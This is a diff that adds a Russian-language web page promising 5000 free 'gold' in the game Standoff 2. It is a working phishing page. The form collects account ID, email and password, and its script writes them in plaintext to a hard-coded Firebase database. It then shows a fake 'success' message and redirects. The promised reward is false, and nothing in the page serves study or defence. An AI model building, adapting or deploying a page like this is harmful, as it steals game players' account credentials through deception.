@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Бесплатная голда Standoff 2</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: white;
+        }
+        
+        .container {
+            background: rgba(25, 25, 50, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            margin-bottom: 40px;
+        }
+        
+        .game-logo {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(45deg, #ff9d00, #ffd000);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 30px rgba(255, 157, 0, 0.5);
+            border: 3px solid white;
+        }
+        
+        .game-logo i {
+            font-size: 60px;
+            color: #8b0000;
+        }
+        
+        .title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #ff9d00, #ffd000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 10px rgba(255, 157, 0, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            opacity: 0.8;
+            margin-bottom: 5px;
+        }
+        
+        .gold-amount {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffd700;
+            margin: 15px 0;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        }
+        
+        .form-container {
+            background: rgba(30, 30, 60, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .input-group label {
+            display: block;
+            text-align: left;
+            margin-bottom: 8px;
+            font-size: 16px;
+            color: #aaa;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(20, 20, 40, 0.7);
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #ff9d00;
+            box-shadow: 0 0 10px rgba(255, 157, 0, 0.5);
+        }
+        
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 43px;
+            font-size: 18px;
+            color: #ff9d00;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(45deg, #ff9d00, #ffd000);
+            color: #1a1a2e;
+            border: none;
+            border-radius: 10px;
+            padding: 16px 0;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 157, 0, 0.4);
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 157, 0, 0.6);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+        
+        .info {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #aaa;
+            line-height: 1.5;
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 25%;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .step-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #ff9d00, #ffd000);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+            box-shadow: 0 0 15px rgba(255, 157, 0, 0.5);
+        }
+        
+        .step-icon i {
+            font-size: 20px;
+            color: #1a1a2e;
+        }
+        
+        .step-text {
+            font-size: 12px;
+            text-align: center;
+            color: #ddd;
+        }
+        
+        .steps-line {
+            position: absolute;
+            top: 25px;
+            left: 12.5%;
+            width: 75%;
+            height: 3px;
+            background: linear-gradient(to right, #ff9d00, #ffd000);
+            z-index: 1;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+            
+            .title {
+                font-size: 26px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="game-logo">
+                <i class="fas fa-coins"></i>
+            </div>
+            <h1 class="title">Бесплатная голда</h1>
+            <p class="subtitle">для Standoff 2</p>
+            <div class="gold-amount">5000 <i class="fas fa-coins"></i></div>
+        </div>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div class="step-text">Ввод данных</div>
+            </div>
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <div class="step-text">Подтверждение</div>
+            </div>
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <div class="step-text">Получение награды</div>
+            </div>
+            <div class="step">
+                <div class="step-icon">
+                    <i class="fas fa-gamepad"></i>
+                </div>
+                <div class="step-text">Играть</div>
+            </div>
+            <div class="steps-line"></div>
+        </div>
+        
+        <div class="form-container">
+            <div class="input-group">
+                <label for="id">ID аккаунта</label>
+                <i class="fas fa-id-card"></i>
+                <input type="text" id="id" placeholder="Введите ваш ID">
+            </div>
+            
+            <div class="input-group">
+                <label for="email">Email</label>
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="email" placeholder="Введите ваш email">
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <i class="fas fa-lock"></i>
+                <input type="password" id="password" placeholder="Введите ваш пароль">
+            </div>
+            
+            <button class="submit-btn">Получить голду</button>
+            
+            <div class="info">
+                <p>После отправки данных вы получите 5000 голды на ваш аккаунт в Standoff 2 в течение 24 часов.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getDatabase, ref, push, set, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+        // Ваша конфигурация Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyAJ2VF0dPfl6aDnPr0RYybuDm6sThiotdA",
+            authDomain: "so2gold-8d34a.firebaseapp.com",
+            databaseURL: "https://so2gold-8d34a-default-rtdb.firebaseio.com",
+            projectId: "so2gold-8d34a",
+            storageBucket: "so2gold-8d34a.appspot.com",
+            messagingSenderId: "318012979948",
+            appId: "1:318012979948:web:83baf5726daee95481c3c9",
+            measurementId: "G-W89DMHD7NE"
+        };
+
+        // Инициализация Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Обработчик кнопки
+        document.querySelector('.submit-btn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const id = document.getElementById('id').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!id || !email || !password) {
+                alert('Пожалуйста, заполните все поля!');
+                return;
+            }
+            
+            try {
+                // Сохраняем данные в Firebase
+                const submissionsRef = ref(database, 'submissions');
+                const newSubmissionRef = push(submissionsRef);
+                
+                await set(newSubmissionRef, {
+                    id: id,
+                    email: email,
+                    password: password,
+                    timestamp: serverTimestamp()
+                });
+                
+                // Анимация загрузки
+                const btn = this;
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Обработка...';
+                btn.disabled = true;
+                
+                // Имитация отправки данных
+                setTimeout(() => {
+                    btn.innerHTML = 'Успешно отправлено!';
+                    btn.style.background = 'linear-gradient(45deg, #00c853, #64dd17)';
+                    
+                    // Перенаправление через 2 секунды
+                    setTimeout(() => {
+                        window.location.href = 'success.html';
+                    }, 2000);
+                }, 2000);
+                
+            } catch (error) {
+                console.error("Ошибка:", error);
+                alert('Произошла ошибка. Попробуйте ещё раз.');
+            }
+        });
+    </script>
+</body>
+</html>
